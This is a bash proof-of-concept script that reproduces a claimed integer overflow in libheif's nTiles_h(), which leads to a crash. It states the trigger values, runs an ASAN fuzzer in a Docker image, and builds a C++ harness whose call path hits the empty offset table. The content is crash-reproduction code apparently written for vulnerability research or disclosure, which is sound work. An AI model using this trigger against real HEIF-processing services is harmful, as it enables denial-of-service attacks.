#!/bin/bash
# Reproduction script for libheif integer overflow in nTiles_h()/nTiles_v()
# CVE candidate: SIGSEGV via empty tile offset table
# Affected version: libheif 1.21.2
# Docker image: vulagent/libheif:latest

set -e

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
POC_INPUT="${SCRIPT_DIR}/poc_input"

echo "=== libheif nTiles_h() Integer Overflow - Reproduction Script ==="
echo ""
echo "Vulnerability: Integer overflow in nTiles_h() causes m_offsets.resize(0)."
echo "Subsequent access to m_offsets[0] via is_tile_offset_known(0) causes SIGSEGV."
echo ""
echo "Trigger: image_width=0xFFFFFFFE, tile_width=3"
echo "  (0xFFFFFFFE + 3 - 1) / 3 = 0x100000000 / 3 -> wraps to 0 in uint32_t"
echo ""

# Step 1: (Re-)generate the POC input
echo "[*] Generating poc_input..."
python3 "${SCRIPT_DIR}/gen_poc.py"

# Step 2: Show file was created
echo "[*] poc_input: $(wc -c < "${POC_INPUT}") bytes"

# Step 3: Demonstrate crash using the ASAN file_fuzzer on the POC input.
# Note: The file_fuzzer itself does not call heif_image_handle_get_luma_bits_per_pixel(),
# so the crash is not triggered via this path. The crash IS triggered by any caller
# of heif_image_handle_get_luma_bits_per_pixel() or heif_image_handle_get_chroma_bits_per_pixel().
echo ""
echo "[*] Running file_fuzzer on poc_input (documents the file is valid HEIF)..."
docker run --rm \
    -v "${SCRIPT_DIR}:/tmp/poc" \
    -e ASAN_OPTIONS="detect_leaks=0:abort_on_error=0:symbolize=1" \
    vulagent/libheif:latest \
    /out/asan/file_fuzzer /tmp/poc/poc_input 2>&1 || true

echo ""
echo "[*] Building crash harness that calls heif_image_handle_get_luma_bits_per_pixel()..."

# Build and run the direct crash harness
docker run --rm \
    -v "${SCRIPT_DIR}:/tmp/poc" \
    -v "/tmp/libheif-build:/tmp/libheif-build" \
    -e ASAN_OPTIONS="detect_leaks=0:abort_on_error=0:symbolize=1" \
    vulagent/libheif:latest \
    bash -c "
set -e
cat > /tmp/crash_harness.cc << 'HARNESS_EOF'
#include <stdio.h>
#include <stdlib.h>
#include \"libheif/heif.h\"

int main(int argc, char** argv) {
    if (argc < 2) { fprintf(stderr, \"Usage: %s <heif_file>\n\", argv[0]); return 1; }
    FILE* f = fopen(argv[1], \"rb\");
    if (!f) { perror(\"fopen\"); return 1; }
    fseek(f, 0, SEEK_END);
    long sz = ftell(f);
    fseek(f, 0, SEEK_SET);
    uint8_t* data = (uint8_t*)malloc(sz);
    fread(data, 1, sz, f);
    fclose(f);

    heif_init(nullptr);
    struct heif_context* ctx = heif_context_alloc();
    struct heif_error err = heif_context_read_from_memory(ctx, data, sz, nullptr);
    fprintf(stderr, \"Read status: %s\n\", err.code == 0 ? \"OK\" : err.message);

    int n = heif_context_get_number_of_top_level_images(ctx);
    fprintf(stderr, \"Top-level images: %d\n\", n);
    heif_item_id* ids = (heif_item_id*)malloc(n * sizeof(heif_item_id));
    heif_context_get_list_of_top_level_image_IDs(ctx, ids, n);

    for (int i = 0; i < n; i++) {
        struct heif_image_handle* handle = nullptr;
        err = heif_context_get_image_handle(ctx, ids[i], &handle);
        if (err.code != 0) continue;
        fprintf(stderr, \"[CRASH] Calling heif_image_handle_get_luma_bits_per_pixel()...\n\");
        /* This crashes: ImageItem_Tiled::get_luma_bits_per_pixel() calls
           append_compressed_tile_data(0,0) -> is_tile_offset_known(0) ->
           m_offsets[0] on EMPTY vector (size=0 due to nTiles_h overflow) */
        int bpp = heif_image_handle_get_luma_bits_per_pixel(handle);
        fprintf(stderr, \"luma_bpp = %d (should not reach here)\n\", bpp);
        heif_image_handle_release(handle);
    }
    free(ids);
    heif_context_free(ctx);
    free(data);
    heif_deinit();
    return 0;
}
HARNESS_EOF

clang++ -O1 -fno-omit-frame-pointer -gline-tables-only -fsanitize=address \
  -I/src/libheif/libheif/api \
  -I/tmp/libheif-build/libheif \
  -std=c++20 -stdlib=libc++ \
  /tmp/crash_harness.cc \
  -L/tmp/libheif-build/libheif \
  -lheif \
  -Wl,-rpath,/tmp/libheif-build/libheif \
  -o /tmp/crash_harness

echo '[*] Running crash harness...'
/tmp/crash_harness /tmp/poc/poc_input
"

echo ""
echo "[!] If ASAN output shows SEGV in TiledHeader::is_tile_offset_known(), crash is confirmed."
